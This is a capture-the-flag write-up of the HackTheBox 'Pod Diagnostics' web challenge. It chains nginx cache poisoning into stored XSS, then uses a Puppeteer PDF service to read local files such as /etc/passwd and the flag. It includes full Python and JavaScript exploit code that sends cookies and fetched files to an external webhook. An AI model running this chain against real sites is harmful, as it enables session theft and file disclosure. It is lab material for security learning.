---
title: HTB - Pod Diagnostics - web - hard
published: true
category: web
tags: [xss, cache-poisoning, ssrf, puppeteer]
difficulty: hard
seo_description: "HackTheBox Pod Diagnostics web challenge writeup. Nginx cache poisoning to XSS, then SSRF via Puppeteer PDF generation to read local files."
seo_keywords:
  - HackTheBox
  - HTB Pod Diagnostics
  - CTF writeup
  - web security
  - Nginx cache poisoning
  - XSS attack
  - Puppeteer SSRF
  - PDF generation exploit
  - file:// protocol
  - LFI
---

In order to get the flag we need RCE to call `/readflag` and get the output. The PDF generating server has `Access-Control-Allow-Origin` set to `*` so we can make a request from any server to use it, similarly the `stats` server. The stats server calls different stats commands:

- `exec("uptime")`
- `readFile("/proc/stat", "utf8")`
- `readFile("/proc/meminfo", "utf8")`
- `exec("df /")`

None of them seem to accept user input.

---

The python `web` server has a decorator `auth_required`:
```python
try:
    header_value = request.headers.get("Authorization")

    if header_value is None:
        raise AuthenticationException("No Authorization header")

    if not header_value.startswith("Basic "):
        raise AuthenticationException("Only Basic auth supported")
    
    _, encoded_auth = header_value.split(" ")

    decoded_auth = base64.b64decode(encoded_auth).decode()

    username, password = decoded_auth.split(":")

    if username != engineer_username or password != engineer_password:
        raise AuthenticationException("Invalid username and password")

    return f(*args, **kwargs)
except AuthenticationException as e:
    response = make_response(render_template("error.html", status_code=401, error_message="Engineers Only!"), 401)
    response.headers["WWW-Authenticate"] = 'Basic realm="Engineer Portal"'
    return response
```

and it's used in:
- `POST /report/<report_id>`
- `GET /report?report_id=<report_id>`

There is also `/generate-report` which calls `{pdf}/generate?url="http://localhost/"` endpoint and sends the PDF to the user.

---

There is a jinja2 template that have

```
{{ report.render() | safe }}
```

which allows for XSS if `.render()` returns html.

---

## First step

It took me a while as I'm used to start looking for vulnerabilities in the main application and not the more setup / infra stuff, but there is a cache feature in nginx enabled that allows us to **poison the cache**.

The nginx configuration looks as follows:

```nginx
# HERE:
proxy_cache_path /run/nginx/cache keys_zone=stat_cache:10m inactive=10s;

ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
ssl_prefer_server_ciphers on;

access_log /dev/stdout;
access_log /dev/stderr;

server {
    listen 80 default_server;
    listen [::]:80 default_server;

    server_name _;

    location = /stats {
        # AND HERE:
        proxy_cache stat_cache;
        proxy_cache_key "$arg_period";
        proxy_cache_valid 200 15s;

        proxy_pass http://127.0.0.1:3001;
    }

    location / { 
        proxy_pass http://127.0.0.1:3000;
    }
}
```

As you can see, the cache is enabled to the `/stats` endpoint, which is freely available for us. I'm guessing that this will be the first link in the whole vulnerability chain.

The configuration afaic is caching the output of this endpoint based on the `period` query parameter: `proxy_cache_key "$arg_period";`. If we add a following `console.log`:

![screenshot](https://i.imgur.com/3mmU6dB.png)

We will be able to determine whether something cached or not, as the `console.log` will only be executed once per cache key.

In [express.js](https://expressjs.com/) and other major frameworks we can pass the query parameters not only as `string` values, but also as objects and arrays. If we set the query parameter to be an array, nginx will cache the output for the first key, and in the node application we can use it for our advantage, as the `error` reflects our value. For better understanding, here is a visualization of the vulnerability:

![screenshot](https://i.imgur.com/JXKiRvd.png)

The browser on the left is loading first and the second one is displaying the cached version for seemingly normal endpoint `/stats?period=1m`. The console.log is only executed once, so we can determine whether the cache is poisoned or not.

If we now go to the main page which makes use of this endpoint, we can see:

![screenshot](https://i.imgur.com/9sCnWWf.png)

Now I started to develop the exploit script, as I suspect this will be a long chain of vulnerabilities. The first version looks as follows:

```python
import requests
import urllib.parse

host = "http://localhost:1337"

def encode(s: str):
    return urllib.parse.quote(s)


def poison_cache(s: str):
    response = requests.get(f"{host}/stats?{s}")
    
    return response.text


inj = encode(f"<img src=x onerror=alert(1)>")
s = f"period=1m&period={inj}"

print(poison_cache(s))
```

This script poisons the cache with `<img src=x onerror=alert(1)>` just for blind XSS testing, which appears to be working, so that's nice

![screenshot](https://i.imgur.com/bWV3FVD.png)

## Second step

Ok, so we now have XSS in the main page for anyone that visits the page. The next logical interaction we can try to attack is the `Download Diagnostics` button, which triggers the following code:

```python
@app.route("/generate-report")
def generate_report_handler():
    global is_generating_report

    if is_generating_report:
        abort(422)
    
    is_generating_report = True

    try:
        url = f"{pdf_generation_URL}/generate?url={quote('http://localhost/')}"
        pdf_response = requests.get(url)

        if pdf_response is None or pdf_response.status_code != 200:
            is_generating_report = False
            abort(pdf_response.status_code)

        is_generating_report = False
        return send_file(
            io.BytesIO(pdf_response.content), 
            mimetype="application/json", 
            as_attachment=True,
            download_name="report.pdf"
        )
    except:
        is_generating_report = False
        abort(pdf_response.status_code)
```

which triggers puppeteer bot to go to the given `url` and print the page to pdf and return it to the user:

```javascript
const generatePDF = async (url) => {
    ...
    browser = await puppeteer.launch({
        ...
        dumpio: true, // DOCS: > If true, pipes the browser process stdout and stderr to process.stdout and process.stderr.
        ...
    });
    ...
    await page.goto(url, { waitUntil: "networkidle0", timeout: 10_000 });
    output = await page.pdf({ printBackground: true });
    ...
	return output;
};
```

Having an xss on this page, we can call the bot to visit some different url, as now the PDF generation endpoint is controlled by us via the bot. In order to easily manipulate the XSS on the site, I've changed the `pwn.py` script to execute the contents of the `pwn.js` file as the XSS payload and also trigger the bot to visit the `http://localhost/` page.

```python
import requests
import base64
import urllib.parse

host = "http://localhost:1337"
webhook = "https://webhook.site/<your webhook>"

def encode(s: str):
    return urllib.parse.quote(s)


def poison_cache(s: str):
    response = requests.get(f"{host}/stats?{s}")
    return response.text

def trigger_bot_xss():
    requests.get(f"{host}/generate-report")


js = open("pwn.js", "r+").read().replace("WEBHOOK_URL", webhook)
js = base64.b64encode(js.encode()).decode().replace("\n", "")

inj = encode(f"<img src=x onerror=eval(atob(\"{js}\"))>")
s = f"period=1m&period={inj}"
poison_cache(s)
trigger_bot_xss()
```

In order to test whether it works, the `pwn.js` file looks as follows:

```javascript
const log = (lg) => {
	navigator.sendBeacon("WEBHOOK_URL", JSON.stringify(lg));
};
const main = async () => {
	log({
		cookie: document.cookie,
		i: "work properly",
	});
};

main();
```

After executing `python pwn.py` I can see in my [webhook.site](https://webhook.site) that the XSS is working properly:

![screenshot](https://i.imgur.com/frnGeQb.png)

## Flag

Now I modify the `pwn.js` file, in order to verify whether I can truly get the bot to visit any `url` I give it:

```javascript
const log = (lg) => {
	navigator.sendBeacon("WEBHOOK_URL", JSON.stringify(lg));
};

const logfile = async (blob) => {
	const fd = new FormData();
	fd.append("file", blob);
	await fetch("WEBHOOK_URL", {
		method: "POST",
		body: fd,
	});
};

const generatePDF = async (url) => {
	const params = new URLSearchParams();
	params.append("url", url);
	const u = await fetch(`http://localhost:3002/generate?${params.toString()}`);
	const b = await u.blob();
	return b;
};

const main = async () => {
	const blob = await generatePDF("https://example.com");
	await logfile(blob);
};

main();
```

After running `python pwn.py` I get the following pdf on my webhook.site:

![screenshot](https://i.imgur.com/umnG9UJ.png)

so it works! It also works with `file:///etc/passwd`:

![screenshot](https://i.imgur.com/niPz6HS.png)

Even though the challenge has evidently the RCE as the intended solution, we are able to read `file:///flag` and get the flag from the server.

```javascript
const log = (lg) => {
	navigator.sendBeacon("WEBHOOK_URL", JSON.stringify(lg));
};

const logfile = async (blob) => {
	const fd = new FormData();
	fd.append("file", blob);
	await fetch("WEBHOOK_URL", {
		method: "POST",
		body: fd,
	});
};

const generatePDF = async (url) => {
	const params = new URLSearchParams();
	params.append("url", url);
	const u = await fetch(`http://localhost:3002/generate?${params.toString()}`);
	const b = await u.blob();
	return b;
};

const main = async () => {
	try {
		log("start");
		blob = await generatePDF("file:///flag");
		await logfile(blob);
	} catch (e) {
		log(e.toString());
	}
};

main();
```

I guess that the intended solution was to trigger the RCE with the report generating and templating ([SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)) with the `| safe` keyword I mentioned in the beginning, but it doesn't matter how you get to the flag as long as you get it, right? :D
